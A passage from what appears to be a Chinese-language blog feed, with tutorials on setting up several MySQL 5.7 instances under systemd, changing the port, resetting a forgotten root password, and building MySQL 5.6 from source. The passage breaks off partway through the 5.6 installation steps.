5.7 rpm&#x5305;</strong></p><pre><code>rpm -e --nodeps mariadb-libsrpm -ivh mysql-community-common-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-libs-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-client-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-devel-5.7.24-1.el7.x86_64.rpmrpm -ivh mysql-community-server-5.7.24-1.el7.x86_64.rpm</code></pre><p><strong>&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5B58;&#x653E;&#x76EE;&#x5F55;</strong></p><pre><code>mkdir -p /data/mysql/{3306, 3307}mkdir -p /data/mysql/3306/{data, binlog, logs}mkdir -p /data/mysql/3307/{data, binlog, logs}</code></pre><p><strong>&#x521B;&#x5EFA;&#x7528;&#x6237;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4;</strong></p><pre><code>chown -Rf mysql:mysql /data/mysqlmv /etc/my.cnf /etc/my.cnf.bak</code></pre><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3306.cnf</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat&gt;&gt;/etc/my3306.cnf&lt;&lt;EOF</span><br><span class="line">[mysqld]</span><br><span class="line">user = mysql</span><br><span class="line">port = 3306</span><br><span class="line">server_id = 3306</span><br><span class="line">datadir = /data/mysql/3306/data</span><br><span class="line">socket = /data/mysql/3306/mysql3306.sock</span><br><span class="line">symbolic-links = 0</span><br><span class="line">log-error = /data/mysql/3306/logs/mysqld3306.log</span><br><span class="line">pid-file = /data/mysql/3306/mysqld3306.pid</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3307.cnf</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cp /etc/my3306.cnf /etc/my3307.cnf</span><br><span class="line">sed -i &apos;s/3306/3307/g&apos; /etc/my3307.cnf</span><br><span class="line"></span><br><span class="line">[root@jaking mysql5.7]# cat /etc/my3307.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">user = mysql</span><br><span class="line">port = 3307</span><br><span class="line">server_id = 3307</span><br><span class="line">datadir = /data/mysql/3307/data</span><br><span class="line">socket = /data/mysql/3307/mysql3307.sock</span><br><span class="line">symbolic-links = 0</span><br><span class="line">log-error = /data/mysql/3307/logs/mysqld3307.log</span><br><span class="line">pid-file = /data/mysql/3307/mysqld3307.pid</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x5907;&#x4EFD;mysql&#x542F;&#x52A8;&#x670D;&#x52A1;&#x6587;&#x4EF6;</strong></p><pre><code>mv /usr/lib/systemd/system/mysqld.service /usr/lib/systemd/system/mysqld.service.bak</code></pre><p><strong>&#x65B0;&#x589E;mysqld3306.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">cat&gt;&gt;/usr/lib/systemd/system/mysqld3306.service&lt;&lt;EOF</span><br><span class="line">[Unit]</span><br><span class="line">Description=MySQL Server</span><br><span class="line">Documentation=man:mysqld(8)</span><br><span class="line">Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html</span><br><span class="line">After=network.target</span><br><span class="line">After=syslog.target</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=mysql</span><br><span class="line">Group=mysql</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/data/mysql/3306/mysqld3306.pid</span><br><span class="line">TimeoutSec=0</span><br><span class="line">PermissionsStartOnly=true</span><br><span class="line">ExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3306.cnf --daemonize --pid-file=/data/mysql/3306/mysqld3306.pid $MYSQLD_OPTS</span><br><span class="line">EnvironmentFile=-/etc/sysconfig/mysql</span><br><span class="line">LimitNOFILE = 5000</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=1</span><br><span class="line">PrivateTmp=false</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x65B0;&#x589E;mysqld3307.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong><br></p><figure class="highlight"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3307.service</span><br><span class="line">sed -i &apos;s/3306/3307/g&apos; /usr/lib/systemd/system/mysqld3307.service</span><br><span class="line"></span><br><span class="line">[root@jaking mysql5.7]# cat /usr/lib/systemd/system/mysqld3307.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=MySQL Server</span><br><span class="line">Documentation=man:mysqld(8)</span><br><span class="line">Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html</span><br><span class="line">After=network.target</span><br><span class="line">After=syslog.target</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=mysql</span><br><span class="line">Group=mysql</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/data/mysql/3307/mysqld3307.pid</span><br><span class="line">TimeoutSec=0</span><br><span class="line">PermissionsStartOnly=true</span><br><span class="line">ExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3307.cnf --daemonize --pid-file=/data/mysql/3307/mysqld3307.pid </span><br><span class="line">EnvironmentFile=-/etc/sysconfig/mysql</span><br><span class="line">LimitNOFILE = 5000</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=1</span><br><span class="line">PrivateTmp=false</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>&#x521D;&#x59CB;&#x5316;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307</strong></p><pre><code>mysqld --defaults-file=/etc/my3306.cnf --initialize --user=mysql --datadir=/data/mysql/3306/datamysqld --defaults-file=/etc/mysql3307.cnf --initialize --user=mysql --datadir=/data/mysql/3307/data</code></pre><p><strong>&#x542F;&#x52A8;&#x591A;&#x5B9E;&#x4F8B;3306&#x3001;3307</strong></p><pre><code>systemctl daemon-reloadsystemctl start mysqld3306systemctl start mysqld3307netstat -pantul | grep mysqlps aux | grep mysql</code></pre><p><strong>&#x67E5;&#x770B;MySQL root&#x521D;&#x59CB;&#x5BC6;&#x7801;</strong></p><pre><code>cat /data/mysql/3306/logs/mysqld3306.log | grep rootcat /data/mysql/3307/logs/mysqld3307.log | grep root</code></pre><p><strong>&#x767B;&#x5F55;&#x591A;&#x5B9E;&#x4F8B;&#x5E76;&#x4FEE;&#x6539;root&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</strong></p><pre><code># mysql3306&#x5B9E;&#x4F8B;mysql -S /data/mysql/3306/mysql3306.sock -uroot -p </code></pre><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&apos;newPassword&apos;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><pre><code># mysql3307&#x5B9E;&#x4F8B;mysql -S /data/mysql/3307/mysql3307.sock -uroot -p</code></pre><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&apos;New_password&apos;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x589E;&#x52A0;&#x5B9E;&#x4F8B;"><a href="#&#x589E;&#x52A0;&#x5B9E;&#x4F8B;" class="headerlink" title="&#x589E;&#x52A0;&#x5B9E;&#x4F8B;"></a>&#x589E;&#x52A0;&#x5B9E;&#x4F8B;</h4><p><strong>&#x521B;&#x5EFA;&#x76EE;&#x5F55;&#xFF0C;&#x8BBE;&#x7F6E;&#x5C5E;&#x4E3B;&#x5C5E;&#x7EC4;</strong></p><pre><code>mkdir -p /data/mysql/3308/{data, binlog, logs}chown -Rf mysql:mysql /data/mysql/3308</code></pre><p><strong>&#x65B0;&#x589E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;my3308.cnf</strong></p><pre><code>cp /etc/my3306.cnf /etc/my3308.cnfsed -i &apos;s/3306/3308/g&apos; /etc/my3308.cnf</code></pre><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/my3308.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">user = mysql</span><br><span class="line">port = 3308</span><br><span class="line">server_id = 3308</span><br><span class="line">datadir = /data/mysql/3308/data</span><br><span class="line">socket = /data/mysql/3308/mysql3308.sock</span><br><span class="line">symbolic-links = 0</span><br><span class="line"><span class="built_in">log</span>-error = /data/mysql/3308/logs/mysqld3308.log</span><br><span class="line">pid-file = /data/mysql/3308/mysqld3308.pid</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x6DFB;&#x52A0;mysqld3308.service&#x542F;&#x52A8;&#x6587;&#x4EF6;</strong></p><pre><code>cp /usr/lib/systemd/system/mysqld3306.service /usr/lib/systemd/system/mysqld3308.servicesed -i &apos;s/3306/3308/g&apos; /usr/lib/systemd/system/mysqld3308.service</code></pre><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/lib/systemd/system/mysqld3308.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=MySQL Server</span><br><span class="line">Documentation=man:mysqld(8)</span><br><span class="line">Documentation=http://dev.mysql.com/doc/refman/en/using-systemd.html</span><br><span class="line">After=network.target</span><br><span class="line">After=syslog.target</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=mysql</span><br><span class="line">Group=mysql</span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/data/mysql/3308/mysqld3308.pid</span><br><span class="line">TimeoutSec=0</span><br><span class="line">PermissionsStartOnly=<span class="literal">true</span></span><br><span class="line">ExecStart=/usr/sbin/mysqld --defaults-file=/etc/my3308.cnf --daemonize --pid-file=/data/mysql/3308/mysqld3308.pid </span><br><span class="line">EnvironmentFile=-/etc/sysconfig/mysql</span><br><span class="line">LimitNOFILE = 5000</span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=1</span><br><span class="line">PrivateTmp=<span class="literal">false</span></span><br></pre></td></tr></tbody></table></figure><p><strong>&#x521D;&#x59CB;&#x5316;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308</strong></p><pre><code>mysqld --defaults-file=/etc/my3308.cnf --initialize --user=mysql --datadir=/data/mysql/3308/data</code></pre><p><strong>&#x542F;&#x52A8;&#x65B0;&#x589E;&#x5B9E;&#x4F8B;3308</strong></p><pre><code>systemctl start mysqld3308netstat -nutpl | grep mysql</code></pre><p><strong>&#x83B7;&#x53D6;mysql3308 root&#x521D;&#x59CB;&#x5316;&#x5BC6;&#x7801;</strong></p><pre><code>cat /data/mysql/3308/logs/mysqld3308.log | grep root</code></pre><p><strong>&#x767B;&#x5F55;mysql3308&#x4FEE;&#x6539;&#x9ED8;&#x8BA4;&#x5BC6;&#x7801;</strong></p><pre><code>mysql -S /data/mysql/3308/mysql3308.sock -uroot -p</code></pre><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&quot;NewPassword&quot;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><hr><hr><h2 id="&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;"><a href="#&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;" class="headerlink" title="&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;"></a>&#x4FEE;&#x6539;MySQL&#x7AEF;&#x53E3;</h2><pre><code>vim /etc/my.cnf[mysqld]datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0port=3307log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidnetstat -pantul | grep 3307</code></pre><hr><hr><h2 id="MySQL-5-7-&#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;"><a href="#MySQL-5-7-&#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;" class="headerlink" title="MySQL 5.7 &#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;"></a>MySQL 5.7 &#x5FD8;&#x8BB0;root&#x5BC6;&#x7801;</h2><p><strong>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7ED5;&#x8FC7;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;</strong></p><pre><code>echo skip-grant-tables &gt;&gt; /etc/my.cnf/etc/init.d/mysqld restart</code></pre><p><strong>&#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93;root&#x5BC6;&#x7801;</strong></p><pre><code>mysql</code></pre><figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&apos;root&apos;</span>@<span class="string">&apos;localhost&apos;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&apos;new_Password&apos;</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></tbody></table></figure><p><strong>&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5220;&#x9664;skil-grant-tables&#xFF0C;&#x6062;&#x590D;&#x5BC6;&#x7801;&#x9A8C;&#x8BC1;</strong></p><p><strong>&#x91CD;&#x542F;MySQL</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-7&quot;&gt;&lt;a href=&quot;#&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-7&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6E90;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL5.6</title>
    <link href="https://marnm.github.io//posts/16fc5dc4/"/>
    <id>https://marnm.github.io//posts/16fc5dc4/</id>
    <published>2022-06-07T04:43:37.000Z</published>
    <updated>2022-06-07T05:15:22.592Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-6"><a href="#&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL-5-6" class="headerlink" title="&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.6"></a>&#x6E90;&#x7801;&#x5B89;&#x88C5;MySQL 5.6</h2><p><strong>1. &#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;~]# cd /usr/local/src</span><br><span class="line">[root@localhost&#xA0;src]#&#xA0;yum&#xA0;install&#xA0;&#x2010;y&#xA0;&#xA0;gcc*&#xA0;&#xA0;make&#xA0;&#xA0;ncurses* perl*</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>2. &#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;src]#&#xA0;tar&#xA0;xvf&#xA0;cmake&#x2010;2.8.11.2.tar.gz</span><br><span class="line">[root@localhost&#xA0;src]#&#xA0;cd&#xA0;cmake&#x2010;2.8.11.2</span><br><span class="line">[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;./configure</span><br><span class="line">[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;make</span><br><span class="line">[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;make&#xA0;install</span><br></pre></td></tr></tbody></table></figure><p></p><p><strong>3. &#x914D;&#x7F6E;MySQL</strong></p><p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x6267;&#x884C;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x8D26;&#x6237;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;cmake&#x2010;2.8.11.2]#&#xA0;cd&#xA0;..</span><br><span class="line">[root@localhost&#xA0;src]#&#xA0;useradd&#xA0;mysql&#xA0;&#x2010;s&#xA0;/sbin/nologin</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x521B;&#x5EFA;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;<br>&#x4FEE;&#x6539;&#x4E3A;mysql  &#x5176;&#x4E2D;&#xFF0C;/usr/local/mysql &#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x76EE;<br>&#x5F55;&#xFF0C;/usr/local/mysql/var &#x5219;&#x662F;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;src]#&#xA0;mkdir&#xA0;&#x2010;p&#xA0;/usr/local/mysql/var</span><br><span class="line">[root@localhost&#xA0;src]#&#xA0;chown&#xA0;&#x2010;Rf&#xA0;mysql:mysql&#xA0;/usr/local/mysql</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5; MySQL &#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F; cmake &#x547D;&#x4EE4;&#xFF0C;&#x5176;<br>&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-<br>DMYSQL_DATADIR &#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR &#x5219;&#x662F;&#x5B9A;&#x4E49;<br>MySQL &#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;src]#&#xA0;tar&#xA0;xvf&#xA0;mysql&#x2010;5.6.19.tar.gz</span><br><span class="line">[root@localhost&#xA0;src]#&#xA0;cd&#xA0;mysql&#x2010;5.6.19</span><br><span class="line">[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;cmake&#xA0;.&#xA0;&#x2010;DCMAKE_INSTALL_PREFIX=/usr/local/mysql&#xA0;&#x2010;DMYSQL_DATADIR=/usr/local/mysql/var&#xA0;&#x2010;DSYSCONFDIR=/etc</span><br><span class="line">[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;make&#xA0;&amp;&amp;&#xA0;make&#xA0;install</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E3A;&#x4E86;&#x8BA9; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664; /etc &#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728; MySQL &#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55; scripts &#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; mysql_install_db &#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528; &#x2013;user &#x53C2;&#x6570;&#x6307;&#x5B9A; MySQL &#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528; &#x2013;basedir &#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL &#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528; &#x2013;datadir &#x53C2;&#x6570;<br>&#x6307;&#x5B9A; MySQL &#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x65B0;&#x7684;MySQL &#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;rm&#xA0;&#x2010;rf&#xA0;/etc/my.cnf</span><br><span class="line">[root@localhost&#xA0;mysql&#x2010;5.6.19]#&#xA0;cd&#xA0;/usr/local/mysql</span><br><span class="line">[root@localhost&#xA0;mysql]#&#xA0;./scripts/mysql_install_db&#xA0;&#x2010;&#x2010;user=mysql&#xA0;&#x2010;&#x2010;basedir=/usr/local/mysql&#xA0;&#x2010;&#x2010;datadir=/usr/local/mysql/var</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x628A;Linux&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x8BB0;&#x5F97;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost&#xA0;mysql]#&#xA0;ls</span><br><span 